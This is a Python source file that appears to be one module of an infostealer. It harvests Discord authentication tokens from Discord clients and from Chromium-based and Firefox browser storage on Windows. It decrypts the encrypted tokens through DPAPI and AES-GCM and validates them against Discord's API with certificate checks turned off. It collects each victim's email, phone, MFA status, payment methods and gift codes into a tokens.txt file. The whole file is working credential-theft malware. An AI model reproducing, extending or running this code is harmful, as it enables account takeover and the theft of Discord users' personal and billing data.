import os
import re
import json
import base64
import logging
import ctypes
import ctypes.wintypes

import urllib3

try:
    from Crypto.Cipher import AES
except ImportError:
    from Cryptodome.Cipher import AES

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Discord:
    ROAMING = os.getenv('APPDATA', '')
    LOCALAPPDATA = os.getenv('LOCALAPPDATA', '')
    REGEX = r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}'
    REGEX_ENC = r'dQw4w9WgXcQ:[^\s]*'

    TOKEN_PATHS = {
        'Discord': os.path.join(ROAMING, 'discord'),
        'Discord Canary': os.path.join(ROAMING, 'discordcanary'),
        'Discord PTB': os.path.join(ROAMING, 'discordptb'),
        'Lightcord': os.path.join(ROAMING, 'Lightcord'),
        'Opera': os.path.join(ROAMING, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(ROAMING, 'Opera Software', 'Opera GX Stable'),
        'Chrome': os.path.join(LOCALAPPDATA, 'Google', 'Chrome', 'User Data'),
        'Edge': os.path.join(LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'),
        'Brave': os.path.join(LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Vivaldi': os.path.join(LOCALAPPDATA, 'Vivaldi', 'User Data'),
        'Yandex': os.path.join(LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data'),
    }

    DISCORD_CLIENTS = {'Discord', 'Discord Canary', 'Discord PTB', 'Lightcord'}

    _log = logging.getLogger('Discord')

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
            ('cbData', ctypes.wintypes.DWORD),
            ('pbData', ctypes.POINTER(ctypes.c_char)),
        ]

    @staticmethod
    def GetHeaders(token: str | None = None) -> dict:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        }
        if token:
            headers['Authorization'] = token
        return headers

    @classmethod
    def _dpapi_decrypt(cls, encrypted: bytes) -> bytes:
        blob_in = cls.DATA_BLOB()
        blob_in.cbData = len(encrypted)
        blob_in.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted, len(encrypted)),
                                     ctypes.POINTER(ctypes.c_char))
        blob_out = cls.DATA_BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        ):
            data = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return data
        return b''

    @classmethod
    def _get_master_key(cls, path: str) -> bytes | None:
        local_state_path = os.path.join(path, 'Local State')
        if not os.path.isfile(local_state_path):
            return None
        try:
            with open(local_state_path, 'r', encoding='utf-8', errors='ignore') as f:
                local_state = json.load(f)
            encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
            encrypted_key = base64.b64decode(encrypted_key_b64)
            encrypted_key = encrypted_key[5:]  # strip DPAPI prefix
            master_key = cls._dpapi_decrypt(encrypted_key)
            return master_key if master_key else None
        except Exception as e:
            cls._log.debug(f'Failed to get master key from {path}: {e}')
            return None

    @classmethod
    def _decrypt_token(cls, encrypted_token: str, master_key: bytes) -> str | None:
        try:
            token_bytes = base64.b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1])
            iv = token_bytes[3:15]
            payload = token_bytes[15:-16]
            tag = token_bytes[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
            decrypted = cipher.decrypt_and_verify(payload, tag)
            return decrypted.decode('utf-8', errors='ignore')
        except Exception as e:
            cls._log.debug(f'Token decrypt failed: {e}')
            return None

    @classmethod
    def SafeStorageSteal(cls, path: str) -> list[str]:
        tokens: list[str] = []
        master_key = cls._get_master_key(path)
        if not master_key:
            return tokens

        leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
        if not os.path.isdir(leveldb_path):
            return tokens

        for filename in os.listdir(leveldb_path):
            if not filename.endswith(('.log', '.ldb')):
                continue
            filepath = os.path.join(leveldb_path, filename)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                for match in re.findall(cls.REGEX_ENC, content):
                    decrypted = cls._decrypt_token(match, master_key)
                    if decrypted and decrypted not in tokens:
                        tokens.append(decrypted)
            except Exception:
                continue
        return tokens

    @classmethod
    def SimpleSteal(cls, path: str) -> list[str]:
        tokens: list[str] = []
        leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
        if not os.path.isdir(leveldb_path):
            return tokens

        for filename in os.listdir(leveldb_path):
            if not filename.endswith(('.log', '.ldb')):
                continue
            filepath = os.path.join(leveldb_path, filename)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                for match in re.findall(cls.REGEX, content):
                    if match not in tokens:
                        tokens.append(match)
            except Exception:
                continue
        return tokens

    @classmethod
    def FireFoxSteal(cls, path: str) -> list[str]:
        tokens: list[str] = []
        if not os.path.isdir(path):
            return tokens

        for root, dirs, files in os.walk(path):
            for fname in files:
                if fname.endswith(('.sqlite', '.json', '.log', '.ldb', '.js')):
                    fpath = os.path.join(root, fname)
                    try:
                        with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        for match in re.findall(cls.REGEX, content):
                            if match not in tokens:
                                tokens.append(match)
                    except Exception:
                        continue
        return tokens

    @classmethod
    def _validate_token(cls, token: str) -> dict | None:
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        try:
            resp = http.request('GET', 'https://discord.com/api/v9/users/@me',
                                headers=cls.GetHeaders(token), timeout=10.0)
            if resp.status != 200:
                return None
            data = json.loads(resp.data.decode('utf-8'))
            return data
        except Exception as e:
            cls._log.debug(f'Token validation failed: {e}')
            return None

    @classmethod
    def _fetch_billing(cls, token: str) -> list[str]:
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        methods = []
        try:
            resp = http.request('GET', 'https://discord.com/api/v9/users/@me/billing/payment-sources',
                                headers=cls.GetHeaders(token), timeout=10.0)
            if resp.status == 200:
                sources = json.loads(resp.data.decode('utf-8'))
                for src in sources:
                    match src.get('type'):
                        case 1:
                            methods.append(f"Credit Card (*{src.get('last_4', '????')})")
                        case 2:
                            methods.append(f"PayPal ({src.get('email', 'unknown')})")
                        case _:
                            methods.append(f"Unknown ({src.get('type', '?')})")
        except Exception:
            pass
        return methods

    @classmethod
    def _fetch_gift_codes(cls, token: str) -> list[str]:
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        codes = []
        try:
            resp = http.request('GET',
                                'https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-US',
                                headers=cls.GetHeaders(token), timeout=10.0)
            if resp.status == 200:
                gifts = json.loads(resp.data.decode('utf-8'))
                for gift in gifts:
                    code = gift.get('code', '')
                    if code:
                        codes.append(f"https://discord.com/gifts/{code}")
        except Exception:
            pass
        return codes

    @classmethod
    def GetTokens(cls) -> list[dict]:
        collected: list[dict] = []
        seen_tokens: set[str] = set()

        for name, path in cls.TOKEN_PATHS.items():
            if not os.path.isdir(path):
                continue

            raw_tokens: list[str] = []

            if name in cls.DISCORD_CLIENTS:
                raw_tokens.extend(cls.SafeStorageSteal(path))
                raw_tokens.extend(cls.SimpleSteal(path))
            else:
                # Browser paths — search multiple profile dirs
                for item in os.listdir(path):
                    profile_path = os.path.join(path, item)
                    if os.path.isdir(profile_path):
                        ldb = os.path.join(profile_path, 'Local Storage', 'leveldb')
                        if os.path.isdir(ldb):
                            master_key = cls._get_master_key(path)
                            if master_key:
                                for fname in os.listdir(ldb):
                                    if fname.endswith(('.log', '.ldb')):
                                        fpath = os.path.join(ldb, fname)
                                        try:
                                            with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                                                content = f.read()
                                            for match in re.findall(cls.REGEX_ENC, content):
                                                dec = cls._decrypt_token(match, master_key)
                                                if dec and dec not in raw_tokens:
                                                    raw_tokens.append(dec)
                                            for match in re.findall(cls.REGEX, content):
                                                if match not in raw_tokens:
                                                    raw_tokens.append(match)
                                        except Exception:
                                            continue

            # Firefox path check
            firefox_path = os.path.join(cls.ROAMING, 'Mozilla', 'Firefox', 'Profiles')
            if name == 'Discord' and os.path.isdir(firefox_path):
                raw_tokens.extend(cls.FireFoxSteal(firefox_path))

            for token in raw_tokens:
                if token in seen_tokens:
                    continue
                seen_tokens.add(token)

                user_data = cls._validate_token(token)
                if not user_data:
                    continue

                nitro_types = {0: 'None', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}
                premium = user_data.get('premium_type', 0)
                billing = cls._fetch_billing(token)
                gift_codes = cls._fetch_gift_codes(token)

                entry = {
                    'source': name,
                    'token': token,
                    'username': f"{user_data.get('username', 'N/A')}",
                    'display_name': user_data.get('global_name', 'N/A'),
                    'id': user_data.get('id', 'N/A'),
                    'email': user_data.get('email', 'N/A'),
                    'phone': user_data.get('phone', 'N/A'),
                    'mfa_enabled': user_data.get('mfa_enabled', False),
                    'nitro': nitro_types.get(premium, 'Unknown'),
                    'billing': billing,
                    'gift_codes': gift_codes,
                }
                collected.append(entry)
                cls._log.info(f'Valid token from {name}: {user_data.get("username", "?")}')

        return collected

    @classmethod
    def run(cls, output_dir: str) -> None:
        out = os.path.join(output_dir, 'Discord')
        os.makedirs(out, exist_ok=True)

        tokens = cls.GetTokens()
        if not tokens:
            cls._log.info('No valid Discord tokens found')
            return

        lines: list[str] = []
        for t in tokens:
            lines.append(f'Source: {t["source"]}')
            lines.append(f'Token: {t["token"]}')
            lines.append(f'Username: {t["username"]}')
            lines.append(f'Display Name: {t["display_name"]}')
            lines.append(f'ID: {t["id"]}')
            lines.append(f'Email: {t["email"]}')
            lines.append(f'Phone: {t["phone"]}')
            lines.append(f'MFA: {t["mfa_enabled"]}')
            lines.append(f'Nitro: {t["nitro"]}')
            lines.append(f'Billing: {", ".join(t["billing"]) if t["billing"] else "None"}')
            lines.append(f'Gift Codes: {", ".join(t["gift_codes"]) if t["gift_codes"] else "None"}')
            lines.append('=' * 60)

        with open(os.path.join(out, 'tokens.txt'), 'w', encoding='utf-8') as f:
            f.write('\n'.join(lines))

        cls._log.info(f'Saved {len(tokens)} token(s) to {out}')
